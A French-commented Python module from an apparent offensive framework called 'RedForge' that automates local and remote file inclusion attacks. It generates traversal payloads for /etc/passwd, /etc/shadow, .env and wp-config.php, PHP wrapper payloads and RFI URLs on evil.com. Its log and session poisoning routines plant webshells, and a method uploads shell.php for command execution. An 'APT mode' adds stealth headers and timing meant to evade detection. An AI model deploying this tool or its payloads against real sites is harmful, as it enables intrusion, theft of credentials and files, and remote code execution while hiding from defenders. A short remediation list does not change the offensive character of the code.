#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module LFI/RFI pour RedForge
Détection et exploitation des vulnérabilités d'inclusion de fichiers
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class LFIRFIConfig:
    """Configuration avancée pour la détection LFI/RFI"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_params: Tuple[float, float] = (1, 3)
    delay_between_payloads: Tuple[float, float] = (0.3, 0.8)
    
    # Comportement
    max_depth: int = 10
    test_all_params: bool = True
    test_rfi: bool = True
    test_wrappers: bool = True
    test_php_input: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_error_based: bool = True
    test_log_poisoning: bool = True
    test_session_poisoning: bool = True
    max_file_size: int = 10000  # Taille max à lire


class LFIRFIAttack:
    """Détection et exploitation avancée des vulnérabilités LFI/RFI"""
    
    def __init__(self, config: Optional[LFIRFIConfig] = None):
        """
        Initialise le détecteur LFI/RFI
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or LFIRFIConfig()
        
        # Payloads LFI
        self.lfi_payloads = self._generate_lfi_payloads()
        
        # Payloads RFI
        self.rfi_payloads = self._generate_rfi_payloads()
        
        # Fichiers sensibles à tester
        self.sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/group",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/www/html/config.php",
            "/var/www/html/.env",
            "/var/www/html/wp-config.php",
            "C:\\windows\\win.ini",
            "C:\\xampp\\htdocs\\config.php"
        ]
        
        # Signatures de succès
        self.success_signatures = {
            "passwd": [r'root:.*:0:0:', r'daemon:.*:1:1:', r'bin:.*:2:2:'],
            "shadow": [r'root:\$.*:\d+:\d+:::'],
            "win_ini": [r'\[fonts\]', r'\[extensions\]', r'\[mci extensions\]'],
            "php_source": [r'<\?php', r'define\s*\(', r'function\s+\w+\s*\('],
            "env": [r'PATH=', r'HOME=', r'USER=', r'APP_ENV'],
            "wp_config": [r'DB_NAME', r'DB_USER', r'DB_PASSWORD', r'AUTH_KEY']
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_lfi_payloads(self) -> List[str]:
        """Génère une liste complète de payloads LFI"""
        payloads = []
        
        # Basic traversal
        for i in range(1, self.config.max_depth + 1):
            payloads.append("../" * i + "etc/passwd")
            payloads.append("../" * i + "etc/shadow")
            payloads.append("..\\" * i + "windows\\win.ini")
        
        # Encoded payloads
        encodings = [
            ("%2e%2e%2f", "../"),
            ("%252e%252e%252f", "../../"),
            ("%c0%ae%c0%ae%c0%af", "../"),
            ("%2e%2e\\", "..\\"),
            ("..%252f", "../"),
            ("..%c0%af", "../")
        ]
        
        for encoded, decoded in encodings:
            for depth in range(1, 5):
                payloads.append((encoded * depth) + "etc/passwd")
        
        # PHP wrappers
        if self.config.test_wrappers:
            payloads.extend([
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=convert.base64-encode/resource=config.php",
                "php://filter/convert.base64-decode/resource=index.php",
                "php://filter/zlib.deflate/resource=index.php",
                "php://input",
                "expect://id",
                "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php"
            ])
        
        # Absolute paths
        payloads.extend([
            "/etc/passwd",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "C:\\windows\\win.ini"
        ])
        
        # Null byte (anciennes versions)
        for payload in payloads[:10]:
            payloads.append(payload + "%00")
            payloads.append(payload + "\0")
        
        return list(dict.fromkeys(payloads))
    
    def _generate_rfi_payloads(self) -> List[str]:
        """Génère une liste complète de payloads RFI"""
        payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.php",
            "//evil.com/shell.txt",
            "http://evil.com/shell.txt?",
            "http://evil.com/shell.txt%00",
            "http://evil.com/shell.txt%23",
            "ftp://evil.com/shell.txt",
            "https://evil.com/shell.php?cmd=id",
            "http://evil.com/shell.txt?anything=",
            "https://evil.com/shell.txt#anything",
            "http://evil.com/shell.php?/../../"
        ]
        
        # Ajouter des variantes encodées
        encoded_payloads = []
        for payload in payloads:
            encoded_payloads.append(quote(payload))
            encoded_payloads.append(payload.replace("/", "%2f"))
        
        payloads.extend(encoded_payloads)
        
        return list(dict.fromkeys(payloads))
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités LFI/RFI
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - rfi: Activer le scan RFI
                - depth: Profondeur de traversal
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan LFI/RFI sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Scan discret")
        
        vulnerabilities = []
        tested_params = set()
        
        # Extraire les paramètres
        params_to_test = self._get_params_to_test(target, kwargs)
        
        test_rfi = kwargs.get('rfi', self.config.test_rfi)
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT entre les paramètres
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_params))
            
            print(f"    → Test paramètre: {param}")
            
            # Test LFI
            lfi_found = False
            for payload in self.lfi_payloads[:50] if self.config.apt_mode else self.lfi_payloads:
                if self.config.random_delays:
                    time.sleep(random.uniform(*self.config.delay_between_payloads))
                
                result = self._test_lfi(target, param, payload)
                self.payloads_tested += 1
                
                if result['vulnerable']:
                    self.vulnerabilities_found += 1
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "type": "lfi",
                        "severity": "HIGH",
                        "evidence": result['evidence'],
                        "file_type": result.get('file_type', 'unknown'),
                        "content_preview": result.get('content_preview'),
                        "risk_score": 85
                    })
                    print(f"      ✓ LFI trouvée: {param} -> {payload[:40]}...")
                    lfi_found = True
                    break
            
            # Test RFI (si pas déjà trouvé)
            if test_rfi and not lfi_found:
                for payload in self.rfi_payloads[:20] if self.config.apt_mode else self.rfi_payloads:
                    if self.config.random_delays:
                        time.sleep(random.uniform(*self.config.delay_between_payloads))
                    
                    result = self._test_rfi(target, param, payload)
                    self.payloads_tested += 1
                    
                    if result['vulnerable']:
                        self.vulnerabilities_found += 1
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                            "type": "rfi",
                            "severity": "CRITICAL",
                            "evidence": result['evidence'],
                            "risk_score": 95
                        })
                        print(f"      ✓ RFI trouvée: {param} -> {payload[:40]}...")
                        break
        
        # Test de log poisoning
        if self.config.test_log_poisoning:
            log_vulns = self._test_log_poisoning(target, params_to_test)
            vulnerabilities.extend(log_vulns)
        
        # Test de session poisoning
        if self.config.test_session_poisoning:
            session_vulns = self._test_session_poisoning(target, params_to_test)
            vulnerabilities.extend(session_vulns)
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'depth' in kwargs:
            self.config.max_depth = min(kwargs['depth'], 10)
        if 'rfi' in kwargs:
            self.config.test_rfi = kwargs['rfi']
        if 'test_all_params' in kwargs:
            self.config.test_all_params = kwargs['test_all_params']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_depth = min(self.config.max_depth, 5)
            self.config.delay_between_params = (5, 15)
            self.config.delay_between_payloads = (2, 5)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params and self.config.test_all_params:
            params = self._extract_params(target)
        
        if not params:
            params = ['file', 'page', 'view', 'load', 'include', 'path', 'doc', 
                     'document', 'folder', 'dir', 'directory', 'filename', 
                     'template', 'theme', 'lang', 'language']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_lfi(self, target: str, param: str, payload: str) -> Dict[str, Any]:
        """Teste un payload LFI"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'file_type': None,
            'content_preview': None
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Vérifier les signatures de succès
            for sig_type, patterns in self.success_signatures.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['evidence'] = pattern
                        result['file_type'] = sig_type
                        result['content_preview'] = self._get_content_preview(response.text)
                        return result
            
            # Détection basée sur les erreurs PHP
            if self.config.detect_error_based:
                php_errors = [
                    'failed to open stream',
                    'file_get_contents',
                    'include_once',
                    'require_once',
                    'Warning: include(',
                    'Fatal error:',
                    'No such file',
                    'Unable to open'
                ]
                
                for error in php_errors:
                    if error.lower() in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = error
                        return result
            
            # Détection de contenu base64 (wrapper)
            if 'base64' in payload:
                if re.match(r'^[A-Za-z0-9+/]+={0,2}$', response.text.strip()):
                    try:
                        decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                        if '<?php' in decoded or 'define' in decoded:
                            result['vulnerable'] = True
                            result['evidence'] = 'base64_decode'
                            result['file_type'] = 'php_source'
                            result['content_preview'] = self._get_content_preview(decoded)
                            return result
                    except:
                        pass
                    
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass
        
        return result
    
    def _test_rfi(self, target: str, param: str, payload: str) -> Dict[str, Any]:
        """Teste un payload RFI"""
        result = {
            'vulnerable': False,
            'evidence': ''
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(test_url, headers=headers, timeout=15, verify=False)
            
            # Indicateurs de RFI réussie
            rfi_indicators = [
                '<?php',
                'shell_exec',
                'system(',
                'eval(',
                'passthru(',
                'Remote File Inclusion',
                'allow_url_include'
            ]
            
            for indicator in rfi_indicators:
                if indicator.lower() in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = indicator
                    break
                    
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass
        
        return result
    
    def _test_log_poisoning(self, target: str, params: List[str]) -> List[Dict[str, Any]]:
        """
        Teste le log poisoning (injection dans les logs Apache/Nginx)
        
        Args:
            target: URL cible
            params: Liste des paramètres à tester
        """
        vulnerabilities = []
        
        # Payloads pour log poisoning
        log_payloads = [
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_GET['cmd']); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            "<?php eval($_GET['cmd']); ?>"
        ]
        
        # Fichiers de log à tester
        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log"
        ]
        
        for param in params:
            for log_file in log_files:
                for payload in log_payloads:
                    # Injecter le payload dans le User-Agent
                    headers = self._get_stealth_headers({'User-Agent': payload})
                    
                    try:
                        # Faire une requête normale pour écrire dans les logs
                        response = requests.get(target, headers=headers, timeout=10, verify=False)
                        
                        # Tenter d'inclure le fichier de log
                        traversal = "../../../" * 5 + log_file.lstrip('/')
                        result = self._test_lfi(target, param, traversal)
                        
                        if result['vulnerable']:
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": f"Log poisoning via {log_file}",
                                "type": "lfi_log_poisoning",
                                "severity": "HIGH",
                                "evidence": "log_poisoning",
                                "log_file": log_file,
                                "risk_score": 85
                            })
                            return vulnerabilities
                    except:
                        pass
        
        return vulnerabilities
    
    def _test_session_poisoning(self, target: str, params: List[str]) -> List[Dict[str, Any]]:
        """
        Teste le session poisoning (injection dans les fichiers de session PHP)
        
        Args:
            target: URL cible
            params: Liste des paramètres à tester
        """
        vulnerabilities = []
        
        # Payloads pour session poisoning
        session_payloads = [
            "<?php system($_GET['cmd']); ?>",
            "<?php eval($_GET['cmd']); ?>",
            "<?php phpinfo(); ?>"
        ]
        
        # Fichiers de session
        session_paths = [
            "/var/lib/php/sessions/sess_",
            "/tmp/sess_",
            "/var/lib/php5/sess_",
            "/var/lib/php7/sess_"
        ]
        
        for param in params:
            for payload in session_payloads:
                # Injecter le payload via le paramètre
                parsed = urlparse(target)
                query_params = parse_qs(parsed.query)
                
                if param in query_params:
                    query_params[param] = [payload]
                else:
                    query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    headers = self._get_stealth_headers()
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    
                    # Récupérer l'ID de session depuis les cookies
                    session_id = response.cookies.get('PHPSESSID')
                    
                    if session_id:
                        for session_path in session_paths:
                            traversal = "../../../" * 5 + session_path + session_id
                            result = self._test_lfi(target, param, traversal)
                            
                            if result['vulnerable']:
                                vulnerabilities.append({
                                    "parameter": param,
                                    "payload": f"Session poisoning via {session_id}",
                                    "type": "lfi_session_poisoning",
                                    "severity": "HIGH",
                                    "evidence": "session_poisoning",
                                    "session_id": session_id,
                                    "risk_score": 85
                                })
                                return vulnerabilities
                except:
                    pass
        
        return vulnerabilities
    
    def _get_content_preview(self, content: str) -> str:
        """Génère un aperçu du contenu pour le rapport"""
        if not content:
            return None
        
        lines = content.split('\n')
        preview_lines = []
        
        for line in lines[:15]:
            if len(line) > 80:
                preview_lines.append(line[:77] + "...")
            else:
                preview_lines.append(line)
        
        return '\n'.join(preview_lines)
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "lfi_count": len([v for v in vulnerabilities if v['type'] in ['lfi', 'lfi_log_poisoning', 'lfi_session_poisoning']]),
            "rfi_count": len([v for v in vulnerabilities if v['type'] == 'rfi']),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "max_depth": self.config.max_depth,
                "test_rfi": self.config.test_rfi
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité LFI/RFI détectée"}
        
        return {
            "total": len(vulnerabilities),
            "lfi": len([v for v in vulnerabilities if v['type'] in ['lfi', 'lfi_log_poisoning', 'lfi_session_poisoning']]),
            "rfi": len([v for v in vulnerabilities if v['type'] == 'rfi']),
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH'])
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Désactiver allow_url_include et allow_url_fopen dans php.ini")
            recommendations.add("Utiliser des listes blanches pour les fichiers inclus")
            recommendations.add("Configurer open_basedir pour restreindre l'accès aux fichiers")
        
        if any(v['type'] == 'rfi' for v in vulnerabilities):
            recommendations.add("URGENT: Désactiver l'inclusion de fichiers distants")
        
        if any('log_poisoning' in v['type'] for v in vulnerabilities):
            recommendations.add("Restreindre l'accès aux fichiers de log")
            recommendations.add("Nettoyer les entrées de log des caractères dangereux")
        
        if any('session_poisoning' in v['type'] for v in vulnerabilities):
            recommendations.add("Stocker les sessions en dehors du répertoire web")
            recommendations.add("Valider et nettoyer les données de session")
        
        recommendations.add("Utiliser realpath() pour vérifier les chemins de fichiers")
        recommendations.add("Implémenter un mapping sécurisé des fichiers inclus")
        
        return list(recommendations)
    
    def read_file(self, target: str, param: str, file_path: str, 
                  depth: int = None) -> Optional[str]:
        """
        Tente de lire un fichier via LFI
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            file_path: Chemin du fichier à lire
            depth: Profondeur de traversal (auto-détection si None)
        """
        if depth is None:
            # Auto-détection de la profondeur
            for test_depth in range(1, 11):
                traversal = "../" * test_depth + file_path.lstrip('/')
                result = self._test_lfi(target, param, traversal)
                if result['vulnerable']:
                    return result.get('content_preview')
        else:
            traversal = "../" * depth + file_path.lstrip('/')
            result = self._test_lfi(target, param, traversal)
            if result['vulnerable']:
                return result.get('content_preview')
        
        return None
    
    def read_source_code(self, target: str, param: str, script_path: str) -> Optional[str]:
        """
        Tente de lire le code source via des wrappers PHP
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            script_path: Chemin du script
        """
        wrappers = [
            f"php://filter/convert.base64-encode/resource={script_path}",
            f"php://filter/read=convert.base64-encode/resource={script_path}",
            f"php://filter/convert.base64-decode/resource={script_path}",
            f"php://filter/zlib.deflate/resource={script_path}"
        ]
        
        for wrapper in wrappers:
            result = self._test_lfi(target, param, wrapper)
            
            if result['vulnerable'] and result.get('content_preview'):
                content = result['content_preview']
                if 'base64' in wrapper:
                    try:
                        decoded = base64.b64decode(content).decode('utf-8', errors='ignore')
                        if len(decoded) > 50:
                            return decoded
                    except:
                        pass
                return content
        
        return None
    
    def get_shell_via_lfi(self, target: str, param: str, 
                          upload_url: str) -> Dict[str, Any]:
        """
        Tente d'obtenir un shell via LFI + upload
        
        Args:
            target: URL cible
            param: Paramètre LFI vulnérable
            upload_url: URL d'upload de fichier
        """
        result = {
            "success": False,
            "method": None,
            "shell_url": None
        }
        
        # Uploader un webshell
        try:
            from src.attacks.file_system.file_upload import FileUploadAttack
            upload_config = FileUploadAttack()
            
            # Tenter d'uploader un webshell
            test_file = "<?php system($_GET['cmd']); ?>"
            files = {'file': ('shell.php', test_file, 'application/x-php')}
            
            response = requests.post(upload_url, files=files, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Lire le webshell via LFI
                shell_content = self.read_file(target, param, "uploads/shell.php")
                
                if shell_content and '<?php' in shell_content:
                    result["success"] = True
                    result["method"] = "lfi_webshell"
                    result["shell_url"] = upload_url.rstrip('/') + '/uploads/shell.php'
        except:
            pass
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    lfi = LFIRFIAttack()
    results = lfi.scan("https://example.com/page?file=index")
    print(f"LFI/RFI trouvés: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = LFIRFIConfig(apt_mode=True, max_depth=5)
    lfi_apt = LFIRFIAttack(config=apt_config)
    results_apt = lfi_apt.scan("https://example.com/page?file=index", apt_mode=True)
    print(f"LFI/RFI (APT): {results_apt['count']}")
    
    # Lire un fichier si vulnérable
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        content = lfi_apt.read_file(
            "https://example.com/page",
            vuln['parameter'],
            "/etc/passwd",
            depth=3
        )
        if content:
            print(f"\nContenu du fichier: {content[:200]}...")